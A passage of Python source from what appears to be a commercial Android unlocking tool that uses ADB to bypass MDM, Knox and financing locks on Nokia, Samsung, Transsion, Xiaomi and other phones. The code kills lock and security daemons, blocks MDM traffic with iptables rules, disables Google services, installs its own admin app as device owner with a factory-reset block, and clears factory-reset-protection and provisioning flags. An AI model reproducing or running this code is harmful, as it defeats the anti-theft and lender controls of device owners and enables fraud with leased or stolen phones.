            if not adb: self.log('ADB not found', 'e'); return
            r = subprocess.run([adb, 'devices'], capture_output=True, text=True, timeout=15)
            devs = [l.split('\t')[0] for l in r.stdout.split('\n') if '\tdevice' in l and 'unauthorized' not in l]
            if not devs: self.log('No device found', 'e'); return
            s = devs[0]
            self.log(f'Phone Mode: ADB MODE', 's')

            steps = ['Device Info', 'Disable SoftLock', 'ADB Bypass', 'Lockdown', 'Done']
            self._build_progress_ui('NOKIA BYPASS', 5, steps)
            self.root.after(0, lambda: self._show_progress('NOKIA BYPASS'))
            self.root.after(50, lambda: self._update_progress(0, 5, 'Reading device info...', 'running'))

            info = self._show_device_info_full(adb, s)
            if not info: return
            self.root.after(50, lambda: self._update_progress(0, 5, 'Info OK', 'done'))

            # Nokia softlock packages to disable/uninstall
            self.root.after(0, lambda: self._update_progress(1, 5, 'Disabling SoftLock packages...', 'running'))
            nokia_pkgs = [
                'com.nokia.softlock', 'com.nokia.mdm', 'com.nokia.lock',
                'com.hmd.global.softlock', 'com.hmd.global.mdm',
                'com.hmd.global.lock', 'com.hmd.global.security',
            ]
            flags = 0x08000000
            rp = subprocess.run([adb, '-s', s, 'shell', 'pm list packages'], capture_output=True, text=True, timeout=10, creationflags=flags)
            installed = set(l.split(':', 1)[1].strip() for l in rp.stdout.split('\n') if l.startswith('package:'))
            found = [p for p in nokia_pkgs if p in installed]
            for pkg in found:
                subprocess.run([adb, '-s', s, 'shell',
                    f'pm disable-user --user 0 {pkg} 2>/dev/null; pm disable {pkg} 2>/dev/null; pm uninstall --user 0 {pkg} 2>/dev/null'],
                    timeout=10, capture_output=True, creationflags=flags)
            self.log(f'Nokia softlock packages disabled: {len(found)}', 's')
            self.root.after(50, lambda: self._update_progress(1, 5, f'{len(found)} disabled', 'done'))

            # ADB bypass core (same as SPD — no batch files, no relock)
            self.root.after(0, lambda: self._update_progress(2, 5, 'ADB bypass...', 'running'))
            self._adb_bypass_core('NOKIA', CHIPSET_PACKAGES['common'] + CHIPSET_PACKAGES['spd'],
                disable_pkgs=True, quiet=False, uninstall_pkgs=['com.android.vending'])

            self.root.after(0, lambda: self._update_progress(2, 5, 'Core OK', 'done'))
            self.root.after(0, lambda: self._update_progress(3, 5, 'Lockdown OK', 'done'))
            self.root.after(0, lambda: self._update_progress(4, 5, 'Complete', 'done'))
            self.root.after(0, lambda: self._finish_progress(True, 'NOKIA BYPASS COMPLETE'))
            self.root.after(0, lambda: self.status_var.set('Done — Nokia bypass complete'))
            subprocess.run([adb, '-s', s, 'shell', 'settings put global airplane_mode_on 0'], timeout=3, capture_output=True, creationflags=0x08000000)
            self._open_package_freeze(adb, s)
        except Exception as _e:
            self.log(f'Error: {_e}', 'e')
            import traceback as _tb
            for _l in _tb.format_exc().split('\n'):
                if _l.strip(): self.log(_l, 'e')
        finally:
            self._nokia_cleanup()

    def _nokia_cleanup(self):
        self._nokia_loading = False

    def _black_screen_removal(self):
        self.log('BlackScreen Fix', 'c')
        cw = tk.Frame(self.content, bg=self.c['surface2'])
        cw.pack(expand=True, fill=tk.BOTH, padx=20, pady=20)
        card = tk.Frame(cw, bg=self.c['card'])
        card.pack(expand=True, fill=tk.BOTH)
        tk.Label(card, text='BLACKSCREEN REMOVAL', font=('Segoe UI', 20, 'bold'),
                 fg=self.c['accent'], bg=self.c['card']).pack(pady=(40, 40))
        btn = tk.Button(card, text='FIX BLACK SCREEN UNIVERSAL 2026', font=('Segoe UI', 14, 'bold'),
                        bg=self.c['accent'], fg='#000', bd=0, padx=40, pady=16, cursor='hand2',
                        command=lambda: self._run_thread(self._black_screen_run, 'BlackScreen'))
        btn.pack(pady=10)
        tk.Label(card, text='Connect device via USB with ADB debugging enabled',
                 font=('Segoe UI', 9), fg=self.c['muted'], bg=self.c['card']).pack(pady=(0, 40))

    def _black_screen_run(self):
        try:
            flags = 0x08000000
            adb = self._find_adb()
            tools = self._tools_dir()
            r = subprocess.run([adb, 'devices'], capture_output=True, text=True, timeout=15)
            devs = [l.split('\t')[0] for l in r.stdout.split('\n') if '\tdevice' in l and 'unauthorized' not in l]
            if not devs:
                self.log('No ADB device found. Enable USB debugging.', 'e')
                return
            s = devs[0]

            # Read device info
            raw = subprocess.run([adb, '-s', s, 'shell', 'getprop'], capture_output=True, text=True, timeout=15, creationflags=flags).stdout
            p = {}
            for line in raw.split('\n'):
                if ']: [' in line:
                    k, v = line.strip()[1:].split(']: [', 1)
                    p[k] = v.rstrip(']')
            def gp(*keys):
                for k in keys:
                    v = p.get(k, '')
                    if v: return v
                return ''
            self.log(f'Model: {gp("ro.product.model")}  |  Android: {gp("ro.build.version.release")}  |  SDK: {gp("ro.build.version.sdk")}', 'i')
            self.log(f'Platform: {gp("ro.board.platform", "ro.chipname")}  |  Security: {gp("ro.build.version.security_patch")}', 'i')
            self.log(f'Serial: {gp("ro.serialno", "sys.serialnumber")}  |  Build: {gp("ro.build.display.id")}', 'i')
            self.log(f'Device: {gp("ro.product.device")}  |  Manufacturer: {gp("ro.product.manufacturer", "ro.product.brand")}', 'i')

            # 1) Find and install admin APK
            apk = None
            for _n in ['mdm_king_admin_signed.apk', 'mdm_king_admin.apk']:
                _p = os.path.join(tools, _n)
                if os.path.isfile(_p): apk = _p; break
            if not apk:
                self.log('Admin APK not found in tools/', 'e')
                return
            self._ensure_apk_signed(apk)

            for args in [
                [adb, '-s', s, 'install', '-r', '-d', apk],
                    [adb, '-s', s, 'install', '-r', '-d', '--bypass-low-target-sdk-block', apk],
                    [adb, '-s', s, 'install', '-r', '-d', '--no-incremental', apk],
                    None,
            ]:
                if args is None:
                    subprocess.run([adb, '-s', s, 'push', apk, '/data/local/tmp/mdm_admin.apk'],
                                   timeout=15, capture_output=True, creationflags=flags)
                    subprocess.run([adb, '-s', s, 'shell', 'pm install -r /data/local/tmp/mdm_admin.apk 2>/dev/null'],
                                   timeout=30, capture_output=True, creationflags=flags)
                    break
                subprocess.run(args, timeout=30, capture_output=True, creationflags=flags)

            # 2) Kill MDM daemons + block traffic
            subprocess.run([adb, '-s', s, 'shell',
                'killall -9 kgclient policydm scorpiod security_daemon scorpio_security '
                'scorpio trancriticalparavfy uniber tool_service phasecheckserver uniview '
                'tne tnevservice bg6m_lockd persist_lockd spd_lockd 2>/dev/null; '
                'iptables -A OUTPUT -m string --string "knox" --algo bm -j DROP 2>/dev/null; '
                'iptables -A OUTPUT -m string --string "scorpio" --algo bm -j DROP 2>/dev/null; '
                'iptables -A OUTPUT -m string --string "mdm" --algo bm -j DROP 2>/dev/null; '
                'iptables -A OUTPUT -m string --string "bg6m" --algo bm -j DROP 2>/dev/null; '
                'iptables -A OUTPUT -m string --string "transecurity" --algo bm -j DROP 2>/dev/null; '
                'iptables -A OUTPUT -m string --string "phasecheck" --algo bm -j DROP 2>/dev/null'],
                timeout=10, capture_output=True, creationflags=flags)

            # 3) Set device owner (with profile-owner fallback)
            subprocess.run([adb, '-s', s, 'shell',
                'dpm remove-active-admin com.mdmking.admin/.MyAdminReceiver 2>/dev/null'],
                timeout=5, capture_output=True, creationflags=flags)
            rr = subprocess.run([adb, '-s', s, 'shell', 'dpm set-device-owner com.mdmking.admin/.MyAdminReceiver'],
                                timeout=10, capture_output=True, text=True, creationflags=flags)
            do_out = (rr.stdout or '') + (rr.stderr or '')
            if not ('Success' in do_out or 'already' in do_out.lower()):
                rr = subprocess.run([adb, '-s', s, 'shell', 'dpm set-profile-owner com.mdmking.admin/.MyAdminReceiver'],
                                    timeout=10, capture_output=True, text=True, creationflags=flags)

            # 4) Launch admin + configure
            subprocess.run([adb, '-s', s, 'shell',
                'am start -n com.mdmking.admin/.MainActivity --activity-clear-top 2>/dev/null'],
                timeout=5, capture_output=True, creationflags=flags)
            subprocess.run([adb, '-s', s, 'shell',
                'am start -n com.mdmking.admin/.DisableFactoryReset --activity-clear-top 2>/dev/null'],
                timeout=5, capture_output=True, creationflags=flags)
            subprocess.run([adb, '-s', s, 'shell',
                'settings put secure enabled_accessibility_services '
                'com.mdmking.admin/com.mdmking.admin.MyAccessibilityService 2>/dev/null; '
                'pm grant com.mdmking.admin android.permission.WRITE_SECURE_SETTINGS 2>/dev/null; '
                'appops set com.mdmking.admin POST_NOTIFICATIONS allow 2>/dev/null; '
                'dumpsys deviceidle whitelist +com.mdmking.admin 2>/dev/null; '
                'appops set com.mdmking.admin RUN_ANY_IN_BACKGROUND allow 2>/dev/null; '
                'appops set com.mdmking.admin AUTO_START allow 2>/dev/null'],
                timeout=10, capture_output=True, creationflags=flags)

            # 5) Disable MDM/black screen packages (keep Play Store!)
            all_pkgs = [p for p in (CHIPSET_PACKAGES['common'] + CHIPSET_PACKAGES['spd'] + CHIPSET_PACKAGES['mtk']) if 'vending' not in p and p != 'com.scorpio.securitycom']
            for entry in all_pkgs:
                if '/' in entry:
                    comp = entry.replace('\\', '')
                    subprocess.run([adb, '-s', s, 'shell', f'pm disable {comp} 2>/dev/null'],
                                   capture_output=True, timeout=5, creationflags=flags)
                else:
                    subprocess.run([adb, '-s', s, 'shell', f'pm disable {entry} 2>/dev/null'],
                                   capture_output=True, timeout=5, creationflags=flags)

            # 6) Whitelist admin + reboot
            subprocess.run([adb, '-s', s, 'shell', 'dumpsys deviceidle whitelist +com.mdmking.admin 2>/dev/null'],
                           timeout=3, capture_output=True, creationflags=flags)
            subprocess.run([adb, '-s', s, 'shell', 'appops set com.mdmking.admin RUN_ANY_IN_BACKGROUND allow'],
                           timeout=3, capture_output=True, creationflags=flags)
            subprocess.run([adb, '-s', s, 'shell', 'appops set com.mdmking.admin AUTO_START allow'],
                           timeout=3, capture_output=True, creationflags=flags)
            subprocess.run([adb, '-s', s, 'shell', 'pm grant com.mdmking.admin android.permission.RECEIVE_BOOT_COMPLETED'],
                           timeout=3, capture_output=True, creationflags=flags)
            subprocess.run([adb, '-s', s, 'shell', 'am broadcast -a com.mdmking.admin.ACTION_START 2>/dev/null'],
                           timeout=3, capture_output=True, creationflags=flags)

            self.log('Rebooting device...', 'i')
            threading.Thread(target=lambda: subprocess.run(
                [adb, '-s', s, 'shell', 'reboot'], timeout=30, capture_output=True, creationflags=flags),
                daemon=True).start()
            time.sleep(2)
            self.log('BlackScreen fix complete! Device should boot normally now.', 's')
        except Exception as e:
            self.log(f'BlackScreen error: {e}', 'e')

    def _adb_bypass_core(self, label, purge_pkgs, disable_only=None, skip_airplane=False, device_serial=None, skip_reboot=False, disable_pkgs=False, quiet=False, uninstall_pkgs=None):
        """Run ADB bypass core — wrapped in try/except so thread exceptions are logged, not silent."""
        try:
            _owner_ok = False
            flags = 0x08000000
            tools = self._tools_dir()
            adb = None
            for _p in [r'C:\Program Files\platform-tools\adb.exe', self._find_adb()]:
                if _p and os.path.isfile(_p):
                    try:
                        _v = subprocess.run([_p, 'version'], capture_output=True, text=True, timeout=3).stdout
                        if 'Android Debug Bridge' in _v:
                            adb = _p
                            break
                    except: pass
            if not adb:
                self.log('ADB not found — check tools directory or PATH', 'e')
                return
            if device_serial: s = device_serial
            else:
                r = subprocess.run([adb, 'devices'], capture_output=True, text=True, timeout=15)
                devs = [l.split('\t')[0] for l in r.stdout.split('\n') if '\tdevice' in l]
                if not devs: self.log('No device', 'e'); return
                s = devs[0]
            # ── Read full device info (SamFw style) ──
            raw = subprocess.run([adb, '-s', s, 'shell', 'getprop'], capture_output=True, text=True, timeout=10, creationflags=flags).stdout
            p = {}
            for line in raw.split('\n'):
                if ']: [' in line:
                    k, v = line.strip()[1:].split(']: [', 1)
                    p[k] = v.rstrip(']')
            def g(*keys):
                for k in keys:
                    v = p.get(k, '')
                    if v: return v
                    try: v = subprocess.run([adb, '-s', s, 'shell', f'getprop {k}'], capture_output=True, text=True, timeout=3, creationflags=flags).stdout.strip()
                    except Exception: pass
                    if v: p[k] = v; return v
                return ''
            def gl(*keys):
                for k in sorted(p.keys()):
                    if any(x in k.lower() for x in keys) and p[k]: return p[k]
                return ''
            def gv(*patterns):
                for k, v in sorted(p.items()):
                    if v and any(x in v.lower() for x in patterns): return v
                return ''
            def gx(cmd):
                try: return subprocess.run([adb, '-s', s, 'shell', cmd], capture_output=True, text=True, timeout=5, creationflags=flags).stdout.strip()
                except Exception: return ''
            hw = [('📱', 'Model', g("ro.product.model"), None), ('ðŸ­', 'Brand', g("ro.product.brand"), None), ('📛', 'Device name', g("ro.product.device"), None), ('ðŸ·ï¸', 'Product name', g("ro.product.name", "ro.build.product"), None), ('💾', 'CPU', g("ro.product.board", "ro.board.platform"), None), ('⚙ï¸', 'Platform', g("ro.chipname", "ro.board.platform", "ro.soc.model"), None), ('ðŸ—ï¸', 'CPU Arch', g("ro.product.cpu.abi"), None), ('🔢', 'Serial number', g("ro.serialno", "sys.serialnumber"), None)]
            def _valid_imei(s): return s and s.isdigit() and len(s) == 15 and s[:2] in ('35', '01', '86', '00')
            imei1 = g("ro.ril.miui.imei", "persist.radio.imei", "ro.telephony.imei", "gsm.imei", "ril.IMEI1", "ril.IMEI")
            if _valid_imei(imei1): hw.append(('📡', 'IMEI1', imei1, None))
            fw = [('ðŸ—ï¸', 'Build', g("ro.build.display.id", "ro.build.id"), None), ('🤖', 'Android version', g("ro.build.version.release"), None), ('🛠ï¸', 'Android SDK', g("ro.build.version.sdk"), None), ('🛡ï¸', 'Security patch', g("ro.build.version.security_patch"), None), ('📻', 'Baseband', g("gsm.version.baseband"), None)]
            bl_val = g("ro.boot.bootloader")
            if bl_val: fw.append(('🔌', 'Bootloader', bl_val, None))
            csc_v = gl("csc", "sales_code")
            if csc_v: fw.append(('ðŸŒ', 'CSC', csc_v, None))
            cs = [('🔌', 'USB', g("sys.usb.config", "persist.sys.usb.config"), None)]
            bcap = gx('dumpsys battery 2>/dev/null | grep -i "level:"')
            if bcap: cs.append(('🔋', 'Battery', bcap.split(':')[1].strip() if ':' in bcap else bcap, None))
            btemp = gx('dumpsys battery 2>/dev/null | grep -i "temperature:"')
            if btemp: cs.append(('🌡ï¸', 'Temp', str(int(int(btemp.split(':')[1].strip()) / 10)) + '°C' if ':' in btemp else '', None))
            mem = gx('dumpsys meminfo 2>/dev/null | grep -i "total ram:" | head -1')
            if mem: cs.append(('💿', 'RAM', mem.split(':')[1].strip() if ':' in mem else mem, None))
            self.log('Device Connected:', 'h')
            self.log(f'Check Device State:........{"✔" if s else "✘"}', 's')
            self.log(f'Model Name:{g("ro.product.model"):>26}', 'i')
            self.log(f'Device Name:{g("ro.product.device"):>24}', 'i')
            self.log(f'Serial:{g("ro.serialno", "sys.serialnumber"):>28}', 'i')
            self.log(f'Manufacture:{g("ro.product.manufacturer", "ro.product.brand"):>23}', 'i')
            self.log(f'Platform:{g("ro.board.platform", "ro.chipname"):>26}', 'i')
            self.log(f'Android Version:{g("ro.build.version.release"):>19}', 'i')
            self.log(f'Sdk Version:{g("ro.build.version.sdk"):>22}', 'i')
            self.log(f'Timezone:{g("persist.sys.timezone"):>25}', 'i')
            self.log(f'Firmware Version:{g("ro.build.display.id"):>18}', 'i')
            self.log(f'Build Id:{g("ro.build.id"):>25}', 'i')
            self.log(f'Security Patch:{g("ro.build.version.security_patch"):>19}', 'i')
            self.log(f'Country:{g("persist.sys.country", "ro.csc.countryiso"):>25}', 'i')
            self.log(f'Network Type:{g("gsm.network.type"):>22}', 'i')
            self.log_blank()
            # Keep phone awake + prevent lock during bypass
            for _wakeline in [
                'svc power stayon true 2>/dev/null',
                'settings put global stay_on_while_plugged_in 3 2>/dev/null',
                'settings put system screen_off_timeout 1800000 2>/dev/null',
                'settings put secure lockscreen.disabled 1 2>/dev/null',
                'wm dismiss-keyguard 2>/dev/null',
            ]:
                subprocess.run([adb, '-s', s, 'shell', _wakeline],
                    timeout=5, capture_output=True, creationflags=flags)

            # Remove old anonyshu package if present, then check for new one
            r_old = subprocess.run([adb, '-s', s, 'shell', 'pm list packages com.anonyshu 2>/dev/null'], capture_output=True, text=True, timeout=5, creationflags=flags)
            if 'com.anonyshu' in (r_old.stdout or ''):
                subprocess.run([adb, '-s', s, 'shell', 'dpm remove-active-admin com.anonyshu.anonyshu/.MyAdminReceiver 2>/dev/null'], timeout=5, capture_output=True, creationflags=flags)
                subprocess.run([adb, '-s', s, 'shell', 'pm uninstall --user 0 com.anonyshu 2>/dev/null'], timeout=10, capture_output=True, creationflags=flags)
            apk_list = ['mdm_king_admin_signed.apk', 'mdm_king_admin.apk']
            apk = None
            for _name in apk_list:
                _path = os.path.join(tools, _name)
                if os.path.isfile(_path):
                    apk = _path
                    pass
                    break
            if apk is None and not quiet:
                self.log_warn('No admin APK found in tools directory')
            apk_ok = False
            r2 = subprocess.run([adb, '-s', s, 'shell', 'pm list packages com.mdmking.admin'], capture_output=True, text=True, timeout=5, creationflags=flags)
            if 'com.mdmking.admin' in (r2.stdout or ''):
                apk_ok = True
            if apk and os.path.isfile(apk) and not apk_ok:
                self._ensure_apk_signed(apk)
                for i, args in enumerate([
                    [adb, '-s', s, 'install', '-r', '-d', apk],
                    [adb, '-s', s, 'install', '-r', '-d', '--bypass-low-target-sdk-block', apk],
                    None,
                ]):
                    if args is None:
                        try:
                            subprocess.run([adb, '-s', s, 'push', apk, '/data/local/tmp/mdm_admin.apk'], timeout=10, capture_output=True, creationflags=flags)
                            r = subprocess.run([adb, '-s', s, 'shell', 'pm install -r /data/local/tmp/mdm_admin.apk 2>/dev/null'], timeout=60, capture_output=True, text=True, creationflags=flags)
                            apk_ok = 'Success' in (r.stdout or '') or 'Success' in (r.stderr or '')
                        except Exception: apk_ok = False
                        break
                    r = subprocess.run(args, timeout=60, capture_output=True, text=True, creationflags=flags)
                    if 'Success' in (r.stdout or ''): apk_ok = True; break
                    err = (r.stderr or '')[:200].replace('\n', ' ').strip()
                    if err and not quiet: self.log(f'install #{i+1}: {err}', 'w')
            if not apk_ok and not quiet:
                self.log_warn('Admin app NOT installed - bypass may fail')

            # ── Install Aurora Store early (before lockdown/airplane mode) ──
            try:
                subprocess.run([adb, '-s', s, 'shell', 'appops set com.android.shell REQUEST_INSTALL_PACKAGES allow 2>/dev/null'],
                               capture_output=True, creationflags=flags)
                subprocess.run([adb, '-s', s, 'shell', 'appops set com.android.shell INSTALL_PACKAGES allow 2>/dev/null'],
                               capture_output=True, creationflags=flags)
                for _aux in ['aurora-clean.apk', 'aurora-store.apk', 'AuroraStore.apk', 'Aurora.apk', 'aurora_store.apk']:
                    _aux_path = os.path.join(tools, _aux)
                    if not os.path.isfile(_aux_path):
                        continue
                    self._ensure_apk_signed(_aux_path)
                    _done = False
                    # Try adb install first
                    for _aa in [
                        [adb, '-s', s, 'install', '-r', '-d', '-g', _aux_path],
                        [adb, '-s', s, 'install', '-r', '-d', '--bypass-low-target-sdk-block', '-g', _aux_path],
                        [adb, '-s', s, 'install', '-r', '-d', '-t', '--install-reason=0', '-g', _aux_path],
                    ]:
                        try:
                            _r = subprocess.run(_aa, timeout=30, capture_output=True, text=True, creationflags=flags)
                            _out = (_r.stdout or '') + (_r.stderr or '')
                            if _r.returncode == 0 and 'Success' in _out and 'Failure' not in _out:
                                _done = True
                                break
                        except subprocess.TimeoutExpired:
                            break
                        except Exception:
                            break
                    if not _done:
                        # Fallback: push + pm install
                        try:
                            subprocess.run([adb, '-s', s, 'push', _aux_path, '/data/local/tmp/'], timeout=20, capture_output=True, creationflags=flags)
                            _r = subprocess.run([adb, '-s', s, 'shell', f'pm install -r -t -g /data/local/tmp/{_aux} 2>/dev/null'], timeout=60, capture_output=True, text=True, creationflags=flags)
                            _out = (_r.stdout or '') + (_r.stderr or '')
                            if _r.returncode == 0 and 'Success' in _out and 'Failure' not in _out:
                                _done = True
                        except Exception:
                            pass
                    if _done:
                        break
            except Exception:
                pass

            # Kill MDM daemons + block MDM traffic BEFORE activating admin to prevent device lock
            _mdm_procs = ['kgclient', 'policydm', 'trancriticalparavfy', 'uniber', 'tool_service',
                     'phasecheckserver', 'uniview', 'uniresctlopt', 'tranlog', 'tne',
                     'tnevservice', 'phoenixd', 'cotad',
                     'scorpiod', 'security_daemon', 'scorpio_security', 'scorpio',
                     'security', 'transsion.security', 'tee_service',
                     'transsion_daemon', 'phoenixd', 'phoenix_daemon',
                     'securityplugin', 'SecurityPlugin', 'lockscreen_service',
                     'cybercat_acbridge', 'oobe_daemon',
                     'mdm_daemon', 'transsion_mdm', 'mdm_receiver',
                     'bsptest', 'vivo_daemon', 'vivo_service', 'bbk_account', 'bbk_daemon',
                     'miui_daemon', 'xmsf', 'xiaomi_service', 'finddevice',
                     'oppo_daemon', 'coloros_daemon', 'heytap_daemon', 'realme_diag']
            def _kill(adb, s):
                for i in range(0, len(_mdm_procs), 5):
                    batch = _mdm_procs[i:i+5]
                    subprocess.run([adb, '-s', s, 'shell',
                        'killall -9 ' + ' 2>/dev/null; killall -9 '.join(batch) + ' 2>/dev/null'],
                        timeout=10, capture_output=True, creationflags=flags)
            _kill(adb, s)
            subprocess.run([adb, '-s', s, 'shell',
                'iptables -A OUTPUT -m string --string "knox" --algo bm -j DROP 2>/dev/null; '
                'iptables -A OUTPUT -m string --string "samsungdm" --algo bm -j DROP 2>/dev/null; '
                'iptables -A OUTPUT -m string --string "scorpio" --algo bm -j DROP 2>/dev/null; '
                'iptables -A OUTPUT -m string --string "mdm" --algo bm -j DROP 2>/dev/null; '
                'iptables -A OUTPUT -m string --string "vivo" --algo bm -j DROP 2>/dev/null; '
                'iptables -A OUTPUT -m string --string "bbk" --algo bm -j DROP 2>/dev/null; '
                'iptables -A OUTPUT -m string --string "xmsf" --algo bm -j DROP 2>/dev/null; '
                'iptables -A OUTPUT -m string --string "xiaomi" --algo bm -j DROP 2>/dev/null; '
                'iptables -A OUTPUT -m string --string "coloros" --algo bm -j DROP 2>/dev/null; '
                'iptables -A OUTPUT -m string --string "oppo" --algo bm -j DROP 2>/dev/null; '
                'iptables -A OUTPUT -m string --string "realme" --algo bm -j DROP 2>/dev/null; '
                'iptables -A OUTPUT -m string --string "heytap" --algo bm -j DROP 2>/dev/null; '
                'iptables -A OUTPUT -m string --string "transsion" --algo bm -j DROP 2>/dev/null'],
                timeout=10, capture_output=True, creationflags=flags)
            _adb_block_dns(adb, s, flags=flags)
            _kill(adb, s)

            # 1) Check if admin is already device owner — skip if so
            _adm_comp = 'com.mdmking.admin/.MyAdminReceiver'
            _do_check = subprocess.run([adb, '-s', s, 'shell',
                'dumpsys device_policy 2>/dev/null | grep -E "Device Owner:.*com\\.mdmking\\.admin"'],
                capture_output=True, text=True, timeout=5, creationflags=flags).stdout.strip()
            if _do_check:
                _owner_ok = True
            else:
                # 1.5) Clear recovery flags BEFORE attempting dpm
                subprocess.run([adb, '-s', s, 'shell',
                    'killall -9 security transsion.security tee_service scorpio_security 2>/dev/null; '
                    'setprop persist.sys.recovery_mode 0 2>/dev/null; '
                    'setprop persist.vendor.recovery.mode 0 2>/dev/null'],
                    timeout=5, capture_output=True, creationflags=flags)
                # 2) Remove Google accounts (block device owner on Android 10+)
                subprocess.run([adb, '-s', s, 'shell',
                    'pm disable --user 0 com.google.android.gms 2>/dev/null; '
                    'pm disable --user 0 com.google.android.gsf 2>/dev/null; '
                    'pm clear com.google.android.gms 2>/dev/null; '
                    'pm clear com.google.android.gsf 2>/dev/null; '
                    'settings put secure backup_transport null 2>/dev/null; '
                    'settings put global device_provisioned 0 2>/dev/null; '
                    'settings put global stay_on_while_plugged_in 3 2>/dev/null'],
                    timeout=15, capture_output=True, creationflags=flags)
                subprocess.run([adb, '-s', s, 'shell', 'true'], timeout=3, capture_output=True, creationflags=flags)
                subprocess.run([adb, '-s', s, 'shell', 'dpm remove-active-admin com.mdmking.admin/.MyAdminReceiver 2>/dev/null'],
                               timeout=5, capture_output=True, creationflags=flags)
                # 4) Try device owner — main attempt (max 3 retries)
                _sec_retries = 0
                for _cmd in [
                    f'dpm set-device-owner --user 0 {_adm_comp}',
                    f'dpm set-device-owner {_adm_comp}',
                    f'dpm set-profile-owner --user 0 {_adm_comp}',
                    f'dpm set-profile-owner {_adm_comp}',
                ]:
                    r = subprocess.run([adb, '-s', s, 'shell', f'{_cmd} 2>&1'], timeout=10, capture_output=True, text=True, creationflags=flags)
                    _out = ((r.stdout or '') + (r.stderr or '')).strip()
                    if 'Success' in _out or 'already' in _out.lower():
                        _owner_ok = True
                        break
                    elif 'SecurityCom' in _out:
                        _sec_retries += 1
                        if _sec_retries > 3:
                            break
                        if not quiet: self.log('[SECURITY] Blocked by SecurityCom — retrying', 'w')
                        subprocess.run([adb, '-s', s, 'shell', 'true'], timeout=3, capture_output=True, creationflags=flags)
                        continue
                    elif 'account' in _out.lower() and 'remove' in _out.lower():
                        subprocess.run([adb, '-s', s, 'shell', 'pm disable --user 0 com.google.android.gms 2>/dev/null'], timeout=5, capture_output=True, creationflags=flags)
                    elif 'already' in _out.lower():
                        _owner_ok = True; break
                # 5) Fallback: activate as regular admin (no owner, but better than nothing)
                if not _owner_ok:
                    r3 = subprocess.run([adb, '-s', s, 'shell', f'dpm set-active-admin {_adm_comp} 2>&1'],
                                        timeout=5, capture_output=True, text=True, creationflags=flags)
                    _fb_err = ((r3.stdout or '') + (r3.stderr or '')).strip().split('\n')[0][:100]
            if _owner_ok:
                subprocess.run([adb, '-s', s, 'shell', 'am start -n com.mdmking.admin/.MainActivity --activity-clear-top 2>/dev/null'], timeout=5, capture_output=True, creationflags=flags)
                subprocess.run([adb, '-s', s, 'shell',
                    'pm grant com.mdmking.admin android.permission.WRITE_SECURE_SETTINGS 2>/dev/null; '
                    'settings put secure enabled_accessibility_services com.mdmking.admin/com.mdmking.admin.MyAccessibilityService 2>/dev/null; '
                    'pm grant com.mdmking.admin android.permission.RECEIVE_BOOT_COMPLETED 2>/dev/null; '
                    'dumpsys deviceidle whitelist +com.mdmking.admin 2>/dev/null; '
                    'appops set com.mdmking.admin RUN_ANY_IN_BACKGROUND allow 2>/dev/null; '
                    'appops set com.mdmking.admin AUTO_START allow 2>/dev/null; '
                    'appops set com.mdmking.admin POST_NOTIFICATIONS allow 2>/dev/null; '
                    'am start -n com.mdmking.admin/.DisableFactoryReset --activity-clear-top 2>/dev/null'],
                    timeout=10, capture_output=True, creationflags=flags)
            else:
                pass
            _kill(adb, s)
            subprocess.run([adb, '-s', s, 'shell',
                'setprop persist.sys.recovery_mode 0 2>/dev/null; '
                'setprop persist.vendor.recovery.mode 0 2>/dev/null; '
                'setprop persist.sys.oobe.devicelock 0 2>/dev/null; '
                'setprop persist.sys.oobe 0 2>/dev/null; '
                'setprop persist.sys.sim_locked 0 2>/dev/null'],
                timeout=5, capture_output=True, creationflags=flags)
            if purge_pkgs:
                r = subprocess.run([adb, '-s', s, 'shell', 'pm list packages 2>/dev/null'], capture_output=True, text=True, timeout=10, creationflags=flags)
                _installed = set()
                for l in (r.stdout or '').split('\n'):
                    if l.startswith('package:'):
                        _installed.add(l.split('package:', 1)[1].strip())
                _present = [p for p in purge_pkgs if p in _installed and p != 'com.scorpio.securitycom']
                if _present:
                    subprocess.run([adb, '-s', s, 'shell',
                        '; '.join(f'am force-stop {p} 2>/dev/null; pm disable-user --user 0 {p} 2>/dev/null; pm disable {p} 2>/dev/null' for p in _present)],
                        timeout=60, capture_output=True, creationflags=flags)
            if disable_only:
                disable_cmds = []
                extra_vending = False
                for p in disable_only:
                    if p == 'com.android.vending':
                        extra_vending = True
                    else:
                        disable_cmds.append(f'pm disable-user --user 0 {p} 2>/dev/null')
                if disable_cmds:
                    subprocess.run([adb, '-s', s, 'shell', ';'.join(disable_cmds)], timeout=30, creationflags=flags)
                if extra_vending:
                    subprocess.run([adb, '-s', s, 'shell',
                        'pm clear com.android.vending 2>/dev/null; '
                        'pm disable-user --user 0 com.android.vending 2>/dev/null; '
                        'pm disable com.android.vending 2>/dev/null'],
                        timeout=30, capture_output=True, creationflags=flags)
            if uninstall_pkgs:
                for _up in uninstall_pkgs:
                    subprocess.run([adb, '-s', s, 'shell', f'pm uninstall --user 0 {_up} 2>/dev/null'], timeout=10, capture_output=True, creationflags=flags)
            # ── Lockdown: block all MDM escape routes ──
            _kill(adb, s)
            subprocess.run([adb, '-s', s, 'shell',
                'iptables -A OUTPUT -m string --string "knox" --algo bm -j DROP 2>/dev/null; '
                'iptables -A OUTPUT -m string --string "samsungdm" --algo bm -j DROP 2>/dev/null; '
                'iptables -A OUTPUT -m string --string "scorpio" --algo bm -j DROP 2>/dev/null; '
                'iptables -A OUTPUT -m string --string "mdm" --algo bm -j DROP 2>/dev/null; '
                'iptables -A OUTPUT -m string --string "transsion" --algo bm -j DROP 2>/dev/null'],
                timeout=10, capture_output=True, creationflags=flags)
            _adb_block_dns(adb, s, flags=flags)
            subprocess.run([adb, '-s', s, 'shell',
                'killall -9 security transsion.security tee_service scorpio_security 2>/dev/null; '
                'setprop persist.sys.recovery_mode 0 2>/dev/null; '
                'setprop persist.vendor.recovery.mode 0 2>/dev/null; '
                'settings put global device_provisioned 1 2>/dev/null; '
                'settings put secure user_setup_complete 1 2>/dev/null; '
                'settings put global factory_reset_protection 0 2>/dev/null'],
                timeout=10, capture_output=True, creationflags=flags)
            if not skip_airplane:
                subprocess.run([adb, '-s', s, 'shell', 'settings put global airplane_mode_on 1'], timeout=3, capture_output=True, creationflags=flags)
            try:
                subprocess.run([adb, '-s', s, 'shell', 'svc power stayon true'], timeout=10, capture_output=True, creationflags=flags)
            except subprocess.TimeoutExpired:
                pass
        except Exception as _e:
            self.log(f'{label} bypass error: {_e}', 'e')
            import traceback as _tb
            for _l in _tb.format_exc().split('\n'):
                if _l.strip():
                    self.log(_l, 'e')
    
    def _open_package_freeze(self, adb=None, serial=None):
        if serial and adb:
            threading.Thread(target=lambda: self._pkg_fetch_and_show(adb, serial), daemon=True).start()
        else:
            adb = self._find_adb()
            if not adb: return
